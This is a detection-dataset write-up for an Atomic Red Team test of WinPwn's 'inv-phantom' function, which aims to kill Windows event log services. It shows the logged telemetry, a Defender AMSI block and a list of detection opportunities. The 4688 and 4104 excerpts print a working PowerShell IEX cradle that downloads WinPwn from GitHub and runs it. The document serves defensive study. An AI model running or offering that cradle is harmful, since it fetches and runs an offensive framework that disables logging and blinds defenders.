# T1562.001-30: Disable or Modify Tools — WinPwn - Kill the event log services for stealth

## Technique Context

MITRE ATT&CK T1562.001 (Disable or Modify Tools) includes adversary actions that stop or impair defensive tooling. WinPwn is a publicly available PowerShell-based post-exploitation framework. Its `inv-phantom` function is designed to kill Windows Event Log-related services, preventing the host from forwarding security telemetry and reducing the visibility of subsequent attacker activity. Killing the event logging service is a well-established anti-forensic technique used by ransomware groups and nation-state actors prior to lateral movement or data exfiltration.

## What This Dataset Contains

The dataset captures 8 seconds of telemetry from ACME-WS02 during the Atomic Red Team test that downloads and executes WinPwn's `inv-phantom` function. The test makes a live outbound HTTP request to GitHub to fetch the script.

**Security 4688 — Process creation, test framework launches the attack:**
```
New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Process Command Line: "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
inv-phantom -consoleoutput -noninteractive}
```

**PowerShell 4104 — Script block captures the full IEX download cradle:**
```
& {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
inv-phantom -consoleoutput -noninteractive}
```

**PowerShell 4100 — Script error showing Defender blocked the downloaded script:**
```
Error Message = At line:1 char:1
This script contains malicious content and has been blocked by your antivirus software.
Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

**Sysmon EID 22 — DNS query for the download:**
```
QueryName: raw.githubusercontent.com
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;::ffff:185.199.110.133;
```

**Sysmon EID 3 — Network connection to GitHub CDN:**
```
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
DestinationIp: 185.199.111.133
Protocol: tcp
```

**Sysmon EID 1 — Process creates include the WinPwn launch and identity check (whoami.exe).**

## What This Dataset Does Not Contain (and Why)

**Event Log service stopped** — The `EventLog` service was not killed. Windows Defender AMSI blocked the downloaded WinPwn script with `ScriptContainedMaliciousContent` before `inv-phantom` could execute. No EID 7034/7036 (service stopped unexpectedly / state change) appears.

**WinPwn script content in 4104** — Defender blocked the script immediately upon download and IEX invocation. The downloaded WinPwn source code does not appear as a script block in the data; only the download cradle itself was logged before AMSI intervened.

**`sc.exe`, `net.exe`, or `taskkill.exe` process creates** — These tools are typical mechanisms for stopping services. None appear here because the attack was blocked before `inv-phantom` had a chance to run any service manipulation commands.

**Registry or service modifications** — No Sysmon EID 13 or related changes to event log service configuration appear in the data.

## Assessment

This is a **blocked execution** dataset with particularly rich network telemetry. The download cradle reaches GitHub (`raw.githubusercontent.com`) and the DNS resolution is captured in Sysmon EID 22. PowerShell 4100 clearly documents the AMSI block with `ScriptContainedMaliciousContent`. The combination of a live download followed by an AMSI block provides a three-event detection chain: DNS query to GitHub, network connection from `powershell.exe`, AMSI error in the PowerShell operational log. The Sysmon include-mode filter did not suppress the network connection event because PowerShell matches the EID 3 include rules. Security 4688 preserves the full download URL in the command line, pinning the exact WinPwn commit hash used.

## Detection Opportunities Present in This Data

- **IEX download cradle** (Security 4688 / PowerShell 4104): The `iex(new-object net.webclient).downloadstring(...)` pattern in a `powershell.exe` command line is a high-confidence indicator. The specific GitHub URL includes the WinPwn repository path and commit hash.
- **DNS query to raw.githubusercontent.com from powershell.exe** (Sysmon EID 22): PowerShell resolving GitHub raw content delivery domains during interactive execution is suspicious and worth alerting on.
- **Outbound network connection from powershell.exe** (Sysmon EID 3): `powershell.exe` initiating TCP to GitHub CDN addresses at `185.199.x.x` during a session run as `NT AUTHORITY\SYSTEM` is anomalous.
- **AMSI block error** (PowerShell 4100): `ScriptContainedMaliciousContent` with `InvokeExpressionCommand` is a definitive AMSI detection signal. These errors are sometimes overlooked as noise, but they confirm attempted execution of known-malicious content.
- **WinPwn function name**: The string `inv-phantom` in command line arguments or script blocks is a direct indicator for this specific tool.
